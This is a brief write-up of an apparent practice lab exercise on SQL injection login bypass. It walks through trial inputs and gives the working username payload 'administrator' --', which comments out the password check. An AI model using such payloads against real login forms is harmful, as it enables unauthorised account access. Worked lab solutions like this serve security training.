# Lab: SQL injection vulnerability allowing login bypass

**End Goal:** Log in to the application as the ```administrator``` user.

**Analysis**

Username: admin
Password: admin

*Getting invalid username and password.*

Username: '
Password: dsdjwjdlksajhd

*Returned Internal Server Error page so SQL injection will work. Let's try making the rest of it a comment.*

Username: administrator'
Password: dsdjwjdlksajhd

*Returned Internal Server Error page.*

Username: administrator'
Password: dsdjwjdlksajhd

**Answer:** 

Username: administrator' --
Password: dsdjwjdlksajhd



